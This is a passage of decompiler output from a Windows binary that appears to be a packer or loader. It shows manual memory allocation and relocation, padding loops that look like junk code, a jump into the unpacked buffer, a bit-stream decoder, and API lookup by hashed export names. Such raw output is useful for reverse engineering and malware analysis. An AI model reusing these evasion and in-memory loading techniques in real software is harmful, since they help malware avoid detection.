		word32 eax_109 = VirtualAlloc(Mem107[esp_83 - 0x0C + 0x00:LPVOID], Mem107[esp_83 - 0x08 + 0x00:SIZE_T], Mem107[esp_83 - 0x04 + 0x00:DWORD], Mem107[esp_83 + 0x00:DWORD]);
		Mem115[0x00405348:word32] = eax_109;
		word32 ebx_108 = 0x00403000;
		eax_118 = eax_109;
		if (true)
		{
			word32 ecx_263 = eax_109;
			eax_118 = Mem115[0x00405344:word32] - eax_109;
			do
			{
				Mem269[ecx_263 + 0x00:byte] = Mem115[eax_118 + ecx_263:byte];
				ecx_263 = ecx_263 + 0x01;
				esi_267 = esi_267 - 0x01;
			} while (esi_267 != 0x00);
		}
		word32 edi_120 = eax_109 - Mem115[0x00405344:word32];
		if (Mem115[0x00403000:word32] != 0x00)
		{
			Mem206[ebp_166 - 0x04 + 0x00:word32] = 0x01C5;
			do
			{
				word32 ecx_215 = 0x0D;
				do
					ecx_215 = ecx_215 - 0x01;
				while (ecx_215 != 0x00);
				eax_118 = Mem206[ebx_108 + 0x04:word32] - 0x08 >>u 0x01;
				word32 ecx_227 = ebx_108 + 0x08;
				if (eax_118 != 0x00)
				{
					word32 edx_237 = eax_118;
					do
					{
						eax_118 = (word32) Mem206[ecx_227 + 0x00:word16];
						if ((eax_118 & 0xF000) == 0x3000)
						{
							eax_118 = (eax_118 & 0x0FFF) + Mem206[ebx_108 + 0x00:word32] + Mem206[0x00405348:word32];
							Mem260[eax_118 + 0x00:word32] = Mem206[eax_118 + 0x00:word32] + edi_120;
						}
						ecx_227 = ecx_227 + 0x02;
						edx_237 = edx_237 - 0x01;
					} while (edx_237 != 0x00);
				}
				ebx_108 = ebx_108 + Mem206[ebx_108 + 0x04:word32];
			} while (Mem206[ebx_108 + 0x00:word32] != 0x00);
		}
		word32 ecx_130 = 338;
		word32 edx_131 = 0x0A;
		do
		{
			ecx_130 = ecx_130 >>u 0x03;
			Mem138[ebp_166 - 0x04 + 0x00:word32] = ecx_130;
			eax_118 = eax_118 - Mem138[(ebp_166 - 0x04) + 0x00:word32];
			edx_131 = edx_131 - 0x01;
		} while (edx_131 != 0x00);
		Mem145[ebp_166 - 0x9C + 0x00:word32] = eax_118;
		Mem146[ebp_166 - 0x89 + 0x00:word32] = eax_118;
		word32 esp_147 = esp_274 - 0x04;
		Mem148[esp_147 + 0x00:word32] = edx_131;
		Mem150[esp_147 - 0x04 + 0x00:word32] = edx_131;
		Mem152[esp_147 - 0x08 + 0x00:word32] = edx_131;
		Mem154[esp_147 - 0x0C + 0x00:word32] = edx_131;
		word32 eax_155 = RegQueryValueA(Mem154[esp_147 - 0x0C + 0x00:HKEY], Mem154[esp_147 - 0x08 + 0x00:LPCSTR], Mem154[esp_147 - 0x04 + 0x00:LPSTR], Mem154[esp_147 + 0x00:PLONG]);
		word32 esp_156 = esp_147 + 0x04;
		if (eax_155 != 0x06)
		{
			word32 edi_188 = edi_120 - Mem154[(ebp_166 - 0x39) + 0x00:word32];
			Mem190[ebp_166 - 0x43 + 0x00:word32] = Mem154[ebp_166 - 0x43 + 0x00:word32] - eax_155;
			byte SCZO_194;
			word32 ebx_195;
			word32 esi_196;
			word32 edi_197;
			byte SZO_199;
			byte C_200;
			byte Z_201;
			word32 ecx_202;
			byte CZ_203;
			byte dl_204;
			word32 edx_205;
			edi_188();
		}
		Mem170[ebp_166 - 0xFE + 0x00:word32] = Mem154[ebp_166 - 0xFE + 0x00:word32] & eax_155;
		word32 ecx_174 = Mem170[Mem170[ebp_166 - 0x08 + 0x00:word32] + 0x28:word32] + Mem170[0x00405348:word32];
		*ecxOut = ecx_174;
		Mem175[0x0040534C:word32] = ecx_174;
		word32 edi_177;
		*ediOut = Mem175[esp_156 + 0x00:word32];
		word32 ebx_184;
		*ebxOut = Mem175[esp_156 + 0x08:word32];
		return 0x00;
	}
	else
	{
		word32 edi_73;
		*ediOut = Mem0[esp_274 + 0x00:word32];
		word32 ebx_77;
		*ebxOut = Mem0[esp_274 + 0x08:word32];
		return 0x01;
	}
}

// 00401AC0: Register word32 fn00401AC0(Register word32 ebx, Register word32 esi)
word32 fn00401AC0(word32 ebx, word32 esi)
{
	word32 ecx_18 = Mem0[esi + 0x0C:word32];
	word32 eax_22 = Mem0[esi + 0x08:word32];
	word32 edi_14 = 0x01;
	do
	{
		word32 ecx_26 = ecx_18 - 0x01;
		if (ecx_18 == 0x00)
		{
			word32 ecx_81 = Mem0[esi + 0x00:word32];
			eax_22 = (word32) Mem0[ecx_81 + 0x00:byte];
			Mem85[esi + 0x00:word32] = ecx_81 + 0x01;
			ecx_26 = ecx_18 + 0x07;
		}
		edi_14 = (eax_22 >>u 0x07 & 0x01) + edi_14 * 0x02;
		word32 eax_43 = eax_22 * 0x02;
		ecx_18 = ecx_26 - 0x01;
		if (ecx_26 == 0x00)
		{
			word32 ecx_75 = Mem0[esi + 0x00:word32];
			eax_43 = (word32) Mem0[ecx_75 + 0x00:byte];
			Mem79[esi + 0x00:word32] = ecx_75 + 0x01;
			ecx_18 = ecx_26 + 0x07;
		}
		eax_22 = eax_43 * 0x02;
	} while ((eax_43 >>u 0x07 & 0x01) != 0x00);
	Mem63[esi + 0x0C:word32] = ecx_18;
	Mem64[esi + 0x08:word32] = eax_22;
	return edi_14;
}

// 00401C20: Register word32 fn00401C20(Register word32 ebx, Register word32 ebp, Register word32 esi, Register word32 edi, Stack word32 dwArg00, Stack word32 dwArg04, Register out ptr32 ecxOut, Register out ptr32 edxOut, Register out ptr32 ebpOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn00401C20(word32 ebx, word32 ebp, word32 esi, word32 edi, word32 dwArg00, word32 dwArg04, ptr32 & ecxOut, ptr32 & edxOut, ptr32 & ebpOut, ptr32 & esiOut, ptr32 & ediOut)
{
	*edxOut = edx;
	word32 edi_24 = Mem0[Mem0[ebx + 0x3C:word32] + ebx + 0x78:word32];
	word32 eax_27 = Mem0[edi_24 + 0x24 + ebx:word32] + ebx;
	GetProcAddress(0x00, 0x00);
	word32 edi_26 = edi_24 + ebx;
	word32 eax_45 = Mem0[edi_26 + 0x20:word32] + ebx;
	word32 ecx_47 = Mem0[edi_26 + 0x1C:word32] + ebx;
	*ecxOut = ecx_47;
	word32 dwLoc08_110 = 0x00;
	if (Mem0[edi_26 + 0x18:word32] > 0x00)
	{
l00401C93:
		word32 ecx_115 = eax_45[dwLoc08_110 * 0x04] + ebx;
		word32 edx_116 = 0x00;
		*edxOut = edx_116;
		byte al_121 = Mem0[ecx_115 + 0x00:byte];
		if (al_121 != 0x00)
		{
			do
			{
				ecx_115 = ecx_115 + 0x01;
				edx_116 = __rol(edx_116, 0x03) ^ (int32) al_121;
				*edxOut = edx_116;
				al_121 = Mem0[ecx_115 + 0x00:byte];
			} while (al_121 != 0x00);
		}
		word32 ecx_132 = 0x0312;
		word32 esi_133 = 0x52;
		do
		{
			word32 eax_137 = ecx_132 * 0x08 - ecx_132;
			*ecxOut = eax_137;
			if (eax_137 == 0x00)
				*ecxOut = 0x02;
			esi_133 = esi_133 - 0x01;
		} while (esi_133 != 0x00);
		if (edx_116 == dwArg04)
		{
			GetLastError();
			word32 edx_161;
			*edxOut = dwLoc08_110;
			word32 ecx_163;
			*ecxOut = ecx_47;
			word32 edi_165;
			*ediOut = edi;
			word32 esi_170;
			*esiOut = esi;
			word32 ebp_172;
			*ebpOut = ebp;
			return ecx_47[(word32) eax_27[dwLoc08_110 * 0x02] * 0x04] + ebx;
		}
		word32 eax_151 = dwLoc08_110 + 0x01;
		dwLoc08_110 = eax_151;
		if (eax_151 < Mem0[edi_26 + 0x18:word32])
			goto l00401C93;
	}
	return 0x00;
	word32 edi_95;
	*ediOut = dwArg00;
	word32 esi_102;
	*esiOut = dwArg04;
	word32 ebp_104;
	*ebpOut = Mem0[ebp + 0x00:word32];
	return 0x00;
}

